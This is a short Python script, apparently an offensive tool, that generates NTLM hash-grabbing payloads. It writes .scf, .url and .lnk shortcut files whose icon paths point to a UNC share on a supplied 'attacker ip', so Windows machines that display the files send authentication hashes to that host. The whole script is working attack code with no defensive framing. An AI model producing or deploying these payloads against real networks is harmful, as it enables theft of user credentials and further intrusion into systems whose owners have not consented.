import argparse
import random
import os
from time import sleep
from pylnk3 import Lnk

scf = '''
[Shell]
Command=2
IconFile=\\\\{}\\x\\{}.ico
[Taskbar]
Command=ToggleDesktop
'''

url = '''
[InternetShortcut]
URL=http://{}/x/{}.html
IconIndex=1
IconFile=\\\\{}\\x\\{}.ico
'''


def generate(ip, out):
    # scf
    scf_payload = scf.format(ip, f"scf_{random.randint(0, 1000)}")
    with open(f'@{out}.scf', 'w+') as f:
        f.write(scf_payload)
    
    # url
    url_payload = url.format(ip, f"url_{random.randint(0, 1000)}", ip, f"url_{random.randint(0, 1000)}")
    with open(f'@{out}.url', 'w+') as f:
        f.write(url_payload)

    # lnk
    skeleton_path = f"{os.path.dirname(os.path.abspath(__file__))}/skel"
    fname =f"lnk_{random.randint(0, 1000)}.ico"
    path = f"pylnk3 c \\\\\\\\{ip}\\\\x\\\\{fname} {skeleton_path}.lnk"
    os.system(path)
    sleep(1)
    lnk = Lnk(skeleton_path)
    lnk.icon = f'\\\\{ip}\\x\\{fname}'
    lnk.save(f'{out}.lnk')


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='create hash grabbing payloads')
    parser.add_argument('ip',  type=str, help='attacker ip')
    parser.add_argument('out',  type=str, help='output name')
    args = parser.parse_args()
    generate(args.ip, args.out)
